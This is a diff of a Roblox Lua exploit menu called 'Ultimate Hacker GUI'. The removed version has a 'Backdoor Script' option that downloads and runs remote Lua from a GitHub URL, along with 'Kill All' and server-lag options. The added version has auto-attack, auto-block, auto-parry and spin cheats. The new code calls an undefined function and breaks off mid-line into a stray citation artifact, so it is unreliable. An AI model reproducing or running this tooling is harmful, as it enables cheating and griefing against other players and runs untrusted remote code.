@@ -1,132 +1,171 @@
-local ScreenGui = Instance.new("ScreenGui")
-if syn and syn.protect_gui then
-    syn.protect_gui(ScreenGui)
-end
-ScreenGui.Parent = game:GetService("CoreGui")
+-- Ultimate Hacker GUI
 
-local Frame = Instance.new("Frame")
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
-Frame.Size = UDim2.new(0, 350, 0, 250)
-Frame.Active = true
-Frame.Draggable = true
+-- Services
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
 
-local Title = Instance.new("TextLabel")
-Title.Parent = Frame
-Title.Text = "Ultimate Hacker GUI"
-Title.Size = UDim2.new(1, 0, 0, 30)
-Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Title.TextColor3 = Color3.fromRGB(0,255,0)
-Title.Font = Enum.Font.Code
-Title.TextSize = 18
+-- Variables
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local mouse = player:GetMouse()
 
--- Dropdown
-local DropDown = Instance.new("TextButton")
-DropDown.Parent = Frame
-DropDown.Text = "Select Action"
-DropDown.Position = UDim2.new(0, 0, 0, 40)
-DropDown.Size = UDim2.new(1, 0, 0, 30)
-DropDown.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-DropDown.TextColor3 = Color3.fromRGB(255,255,255)
-DropDown.Font = Enum.Font.Code
-DropDown.TextSize = 16
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.CoreGui
+screenGui.Name = "UltimateHackerGUI"
 
-local OptionsFrame = Instance.new("Frame")
-OptionsFrame.Parent = Frame
-OptionsFrame.Position = UDim2.new(0, 0, 0, 70)
-OptionsFrame.Size = UDim2.new(1, 0, 0, 150)
-OptionsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-OptionsFrame.Visible = false
+local frame = Instance.new("Frame")
+frame.Parent = screenGui
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+frame.Position = UDim2.new(0.5, -100, 0.5, -150)
+frame.Size = UDim2.new(0, 200, 0, 300)
+frame.Active = true
+frame.Draggable = true
 
-local Options = {
-    "Backdoor Script",
-    "Play Sound",
-    "Change Skybox",
-    "Kill All",
-    "Lag Server"
-}
+local title = Instance.new("TextLabel")
+title.Parent = frame
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Font = Enum.Font.SourceSansBold
+title.Text = "Ultimate Hacker GUI"
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.TextSize = 18
 
-local Selected = nil
-
-for i, v in pairs(Options) do
-    local btn = Instance.new("TextButton")
-    btn.Parent = OptionsFrame
-    btn.Text = v
-    btn.Position = UDim2.new(0, 0, 0, (i-1)*30)
-    btn.Size = UDim2.new(1, 0, 0, 30)
-    btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
-    btn.TextColor3 = Color3.fromRGB(255,255,255)
-    btn.Font = Enum.Font.Code
-    btn.TextSize = 16
-    btn.MouseButton1Click:Connect(function()
-        DropDown.Text = v
-        Selected = v
-        OptionsFrame.Visible = false
-    end)
+-- Function to create buttons
+local function createButton(name, position, callback)
+    local button = Instance.new("TextButton")
+    button.Parent = frame
+    button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    button.Position = UDim2.new(0.1, 0, 0, position)
+    button.Size = UDim2.new(0.8, 0, 0, 30)
+    button.Font = Enum.Font.SourceSans
+    button.Text = name
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 14
+    button.MouseButton1Click:Connect(callback)
+    return button
 end
 
-DropDown.MouseButton1Click:Connect(function()
-    OptionsFrame.Visible = not OptionsFrame.Visible
-end)
-
-local InputBox = Instance.new("TextBox")
-InputBox.Parent = Frame
-InputBox.Position = UDim2.new(0, 0, 0, 170)
-InputBox.Size = UDim2.new(1, 0, 0, 30)
-InputBox.PlaceholderText = "Optional ID Input"
-InputBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
-InputBox.TextColor3 = Color3.fromRGB(255,255,255)
-InputBox.Visible = false
-InputBox.Font = Enum.Font.Code
-InputBox.TextSize = 16
-
-local Execute = Instance.new("TextButton")
-Execute.Parent = Frame
-Execute.Text = "Execute"
-Execute.Position = UDim2.new(0, 0, 0, 210)
-Execute.Size = UDim2.new(1, 0, 0, 30)
-Execute.BackgroundColor3 = Color3.fromRGB(50,50,50)
-Execute.TextColor3 = Color3.fromRGB(255,255,255)
-Execute.Font = Enum.Font.Code
-Execute.TextSize = 16
-
-DropDown.MouseButton1Click:Connect(function()
-    OptionsFrame.Visible = not OptionsFrame.Visible
-end)
-
-Execute.MouseButton1Click:Connect(function()
-    if Selected == "Backdoor Script" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/coolrobloxkid23/hahagui/main/script.lua"))()
-    elseif Selected == "Play Sound" then
-        local sound = Instance.new("Sound", workspace)
-        sound.SoundId = "rbxassetid://"..InputBox.Text
-        sound.Looped = true
-        sound.Volume = 10
-        sound:Play()
-    elseif Selected == "Change Skybox" then
-        local l = game.Lighting
-        local id = "5221523741"
-        l.Sky.SkyboxBk = "rbxassetid://"..id
-        l.Sky.SkyboxDn = "rbxassetid://"..id
-        l.Sky.SkyboxFt = "rbxassetid://"..id
-        l.Sky.SkyboxLf = "rbxassetid://"..id
-        l.Sky.SkyboxRt = "rbxassetid://"..id
-        l.Sky.SkyboxUp = "rbxassetid://"..id
-    elseif Selected == "Kill All" then
-        for _,plr in pairs(game.Players:GetPlayers()) do
-            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
-                plr.Character.Humanoid.Health = 0
+-- KillAura Toggle
+local killAuraEnabled = false
+createButton("Toggle KillAura", 60, function()
+    killAuraEnabled = not killAuraEnabled
+    if killAuraEnabled then
+        while killAuraEnabled do
+            local target = getClosestPlayer(30)
+            if target then
+                ReplicatedStorage.Remotes.Attack:FireServer(target)
             end
-        end
-    elseif Selected == "Lag Server" then
-        while true do
-            for _,v in pairs(workspace:GetDescendants()) do
-                if v:IsA("BasePart") then
-                    v.Velocity = Vector3.new(math.random(-9999,9999), math.random(-9999,9999), math.random(-9999,9999))
-                end
-            end
-            wait()
+            wait(0.1)
         end
     end
 end)
+
+-- AutoBlock Toggle
+local autoBlockEnabled = false
+createButton("Toggle AutoBlock", 100, function()
+    autoBlockEnabled = not autoBlockEnabled
+    if autoBlockEnabled then
+        while autoBlockEnabled do
+            local target = getClosestPlayer(15)
+            if target then
+                ReplicatedStorage.Remotes.Block:FireServer(true)
+            else
+                ReplicatedStorage.Remotes.Block:FireServer(false)
+            end
+            wait(0.1)
+        end
+    end
+end)
+
+-- AutoParry Toggle
+local autoParryEnabled = false
+createButton("Toggle AutoParry", 140, function()
+    autoParryEnabled = not autoParryEnabled
+    if autoParryEnabled then
+        while autoParryEnabled do
+            local target = getClosestPlayer(15)
+            if target then
+                ReplicatedStorage.Remotes.Parry:FireServer()
+            end
+            wait(0.1)
+        end
+    end
+end)
+
+-- AutoSprint Toggle
+local autoSprintEnabled = false
+createButton("Toggle AutoSprint", 180, function()
+    autoSprintEnabled = not autoSprintEnabled
+    if autoSprintEnabled then
+        humanoid.WalkSpeed = 24
+    else
+        humanoid.WalkSpeed = 16
+    end
+end)
+
+-- SpinBot Toggle
+local spinBotEnabled = false
+createButton("Toggle SpinBot", 220, function()
+    spinBotEnabled = not spinBotEnabled
+    if spinBotEnabled then
+        while spinBotEnabled do
+            character.HumanoidRootPart.CFrame *= CFrame.Angles(0, math.rad(10), 0)
+            wait(0.1)
+        end
+    end
+end)
+
+-- Play Audio
+local audioTextBox = Instance.new("TextBox")
+audioTextBox.Parent = frame
+audioTextBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+audioTextBox.Position = UDim2.new(0.1, 0, 0, 260)
+audioTextBox.Size = UDim2.new(0.6, 0, 0, 30)
+audioTextBox.Font = Enum.Font.SourceSans
+audioTextBox.PlaceholderText = "Audio ID"
+audioTextBox.Text = ""
+audioTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+audioTextBox.TextSize = 14
+
+local playAudioButton = Instance.new("TextButton")
+playAudioButton.Parent = frame
+playAudioButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+playAudioButton.Position = UDim2.new(0.7, 0, 0, 260)
+playAudioButton.Size = UDim2.new(0.2, 0, 0, 30)
+playAudioButton.Font = Enum.Font.SourceSans
+playAudioButton.Text = "Play"
+playAudioButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+playAudioButton.TextSize = 14
+playAudioButton.MouseButton1Click:Connect(function()
+    local sound = Instance.new("Sound")
+    sound.Parent = workspace
+    sound.SoundId = "rbxassetid://" .. audioTextBox.Text
+    sound:Play()
+end)
+
+-- Change Skybox
+local skyboxTextBox = Instance.new("TextBox")
+skyboxTextBox.Parent = frame
+skyboxTextBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+skyboxTextBox.Position = UDim2.new(0.1, 0, 0, 300)
+skyboxTextBox.Size = UDim2.new(0.6, 0, 0, 30)
+skyboxTextBox.Font = Enum.Font.SourceSans
+skyboxTextBox.PlaceholderText = "Skybox ID"
+skyboxTextBox.Text = ""
+skyboxTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+skyboxTextBox.TextSize = 14
+
+local changeSkyboxButton = Instance.new("TextButton")
+changeSkyboxButton.Parent = frame
+changeSkyboxButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+changeSkyboxButton.Position = UDim2.new(0.7, 0, 0, 300)
+changeSkyboxButton.Size = UDim2.new(0.2, 0, 0, 30)
+changeSkyboxButton.Font = Enum.Font.SourceSans
+changeSkyboxButton.Text = "Set"
+changeSkyboxButton.TextColor3 = Color3.fromRGB(255
+::contentReference[oaicite:0]{index=0}
+ 
